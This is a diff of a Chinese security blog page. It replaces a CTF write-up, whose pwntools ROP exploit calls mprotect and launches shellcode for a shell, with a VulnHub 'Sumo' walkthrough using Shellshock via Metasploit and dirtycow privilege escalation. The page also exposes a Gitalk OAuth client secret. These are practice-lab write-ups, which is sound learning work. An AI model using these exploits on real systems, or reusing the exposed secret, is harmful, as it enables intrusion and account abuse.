@@ -7,7 +7,7 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>[PWN]cmcc_simplerop - P1ay2win&#39;s blog</title>
+<title>Sumo walkthrought - P1ay2win&#39;s blog</title>
 
 
 
@@ -67,7 +67,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/header.png" alt="[PWN]cmcc_simplerop" height="28">
+                <img src="/images/header.png" alt="Sumo walkthrought" height="28">
                 P1ay2win&#39;s blog
             
             </a>
@@ -126,13 +126,13 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2022-03-06T09:42:27.000Z">2022-03-06</time>
+                <time class="level-item has-text-grey" datetime="2022-06-12T01:41:27.000Z">2022-06-12</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    3 分钟 读完 (大约 390 个字)
+                    2 分钟 读完 (大约 327 个字)
                 </span>
                 
                 
@@ -144,34 +144,43 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                [PWN]cmcc_simplerop
+                Sumo walkthrought
             
         </h1>
         <div class="content">
-            <h2 id="cmcc-simplerop-Writeup"><a href="#cmcc-simplerop-Writeup" class="headerlink" title="cmcc_simplerop Writeup"></a>cmcc_simplerop Writeup</h2><blockquote>
-<p><a href="https://buuoj.cn/challenges#cmcc_simplerop" target="_blank" rel="noopener">https://buuoj.cn/challenges#cmcc_simplerop</a></p>
-</blockquote>
-<p>IDA打开附件发现主程序就是简单的栈溢出。</p>
-<p><img src="/2022/03/06/PWN-cmcc_simplerop/批注 2020-03-06 171020.png" alt></p>
-<p>并且是静态链接的程序，查找system函数不存在，但发现了mprotect函数。</p>
-<a id="more"></a>
-<p><img src="/2022/03/06/PWN-cmcc_simplerop/批注 2020-03-06 170719.png" alt></p>
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这也是一个很简单的靶机，用到的知识点是<strong>CVE-2014-6278</strong>的bash命令注入和<strong>dirtycow</strong>提权。</p>
 <blockquote>
-<p><code>mprotect(const void *start, size_t len, int prot)</code>函数能改变一个内存区的保护属性，指定的内存区间必须包含整个内存页，我做到的题目页大小通常为1K。既若要改变<code>bss</code>的保护属性，<code>bss</code>的地址为<code>0x80eaf80</code>，则起始地址为<code>0x80ea000</code>，页大小为<code>1000</code>，权限为<code>7</code>表示可读可写可执行。</p>
+<p><a href="https://www.vulnhub.com/entry/sumo-1,480/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/sumo-1,480/</a></p>
 </blockquote>
-<p>现在的思路是通过<code>mprotect</code>改变<code>bss</code>的保护属性，再通过<code>read</code>写入shellcode，跳转到bss处执行。</p>
-<p>以下是exp。</p>
-<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./simplerop'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(<span class="hljs-string">'./simplerop'</span>)</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28957</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="hljs-string">'./simplerop'</span>)</span><br><span class="line"></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">print(hex(bss))</span><br><span class="line"></span><br><span class="line">mprotect_sym = elf.sym[<span class="hljs-string">'mprotect'</span>]</span><br><span class="line">read_sym = elf.sym[<span class="hljs-string">'read'</span>]</span><br><span class="line">pop3 = <span class="hljs-number">0x08048913</span></span><br><span class="line"></span><br><span class="line">payload = flat(cyclic(<span class="hljs-number">32</span>),mprotect_sym,pop3,<span class="hljs-number">0x80ea000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0x7</span>,read_sym,pop3,<span class="hljs-number">0x0</span>,bss+<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>,bss+<span class="hljs-number">0x50</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="hljs-string">':'</span>)</span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="hljs-number">1</span>)</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>当我想要在第一个send前调试的时候，每次程序都异常退出。一开始还以为是payload有错，后来去到bss查看的时候发现shellcode并么有输入全。估计是由于调试程序，发送shellcode比read读取德要快，导致没有输入全，注释掉调试就没有异常退出了。</p>
-<p><img src="/2022/03/06/PWN-cmcc_simplerop/批注 2020-03-06 173405.png" alt></p>
+<a id="more"></a>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>拿到手肯定是要信息收集一波，nmap扫到只开放了22端口和80端口。</p>
+<p><img src="/2022/06/12/Sumo walkthrough/批注 2020-06-12 085032.png" alt="批注 2020-06-12 085032"></p>
+<p>80端口进去是默认页面，目录扫出了<code>cgi-bin</code>和<code>server-status</code>目录，状态码都是403。</p>
+<p><img src="/2022/06/12/Sumo walkthrough/批注 2020-06-12 085641.png" alt="批注 2020-06-12 085641"></p>
+<p>再用nikto扫下，扫出来了CVE-2014-6278和CVE-2014-6271，是bash命令注入的漏洞，msf里已有exp。</p>
+<p><img src="/2022/06/12/Sumo walkthrough/批注 2020-06-12 085914.png" alt="批注 2020-06-12 085914"></p>
+<p>进msf选中利用模块，设置好参数，攻击后正常返回一个meterpreter session。</p>
+<p><img src="/2022/06/12/Sumo walkthrough/批注 2020-06-12 091414.png" alt="批注 2020-06-12 091414"></p>
+<p>启动一个shell之后，运行<code>whoami</code>命令和<code>uname -a</code>命令。当前用户是www-data，并且发现内核版本较低，可用dirtycow提权。</p>
+<p><img src="/2022/06/12/Sumo walkthrough/批注 2020-06-12 091829.png" alt="批注 2020-06-12 091829"></p>
+<p>使用github上的exp</p>
+<blockquote>
+<p><a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a></p>
+</blockquote>
+<p>上传到靶机，并用以下命令编译运行</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc dirty.c -o dirty lpthread</span><br><span class="line">./dirty &lt;new_password&gt;</span><br></pre></td></tr></table></figure>
+<p>命令执行后要等一段时间，成功后会创建名为firefart的root用户，密码为运行命令时输入的密码。</p>
+<p><img src="/2022/06/12/Sumo walkthrough/批注 2020-06-12 093344.png" alt="批注 2020-06-12 093344"></p>
+<p>ssh登录上去，在/root目录即可获得flag。</p>
+<p><img src="/2022/06/12/Sumo walkthrough/批注 2020-06-12 093542.png" alt="批注 2020-06-12 093542"></p>
 
         </div>
         
             <ul class="post-copyright">
-            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2022/03/06/PWN-cmcc_simplerop/">[PWN]cmcc_simplerop</a></li>
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2022/06/12/Sumo walkthrough/">Sumo walkthrought</a></li>
             <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
-            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2022/03/06/PWN-cmcc_simplerop/">https://blog.play2win.top/2022/03/06/PWN-cmcc_simplerop/</a></li>
-            <li><strong>发布时间：</strong>2022-03-06</li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2022/06/12/Sumo walkthrough/">https://blog.play2win.top/2022/06/12/Sumo walkthrough/</a></li>
+            <li><strong>发布时间：</strong>2022-06-12</li>
             <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
             </li>
             </ul>
@@ -181,7 +190,7 @@
             <div class="level-start">
                 <div class="level-item">
                     <span class="is-size-6 has-text-grey has-mr-7">#</span>
-                    <a class="has-link-grey -link" href="/tags/PWN/">PWN</a>, <a class="has-link-grey -link" href="/tags/StackOverflow/">StackOverflow</a>
+                    <a class="has-link-grey -link" href="/tags/提权/">提权"</a>, <a class="has-link-grey -link" href="/tags/靶机/">靶机</a>
                 </div>
             </div>
         </div>
@@ -198,17 +207,10 @@
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
         
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2022/03/25/BJDCTF_writeup/">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">BJDCTF_writeup</span>
-            </a>
-        </div>
-        
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2019/10/26/逆向学习笔记-上海全国大学生网络安全邀请赛-pluzz/">
-                <span class="level-item">[逆向学习笔记]上海全国大学生网络安全邀请赛-pluzz</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2022/06/11/Geisha walkthrough/">
+                <span class="level-item">Geisha walkthrought</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -229,7 +231,7 @@
     var gitalk = new Gitalk({
         clientID: '372fb49f2243341bf93b',
         clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
-        id: 'a95c872f5db2d86d8ad07679727e80b2',
+        id: 'fe5c50dcac8af9e8c8623d96337587a1',
         repo: 'p1ay2win.github.io',
         owner: 'p1ay2win',
         admin: "p1ay2win",
@@ -343,13 +345,13 @@
                     目录
                 </h3>
                 <ul class="menu-list"><li>
-        <a class="is-flex" href="#cmcc-simplerop-Writeup">
+        <a class="is-flex" href="#前言">
         <span class="has-mr-6">1</span>
-        <span>cmcc_simplerop Writeup</span>
+        <span>前言</span>
         </a></li><li>
-        <a class="is-flex" href="#后话">
+        <a class="is-flex" href="#利用过程">
         <span class="has-mr-6">2</span>
-        <span>后话</span>
+        <span>利用过程</span>
         </a></li></ul>
             </div>
         </div>
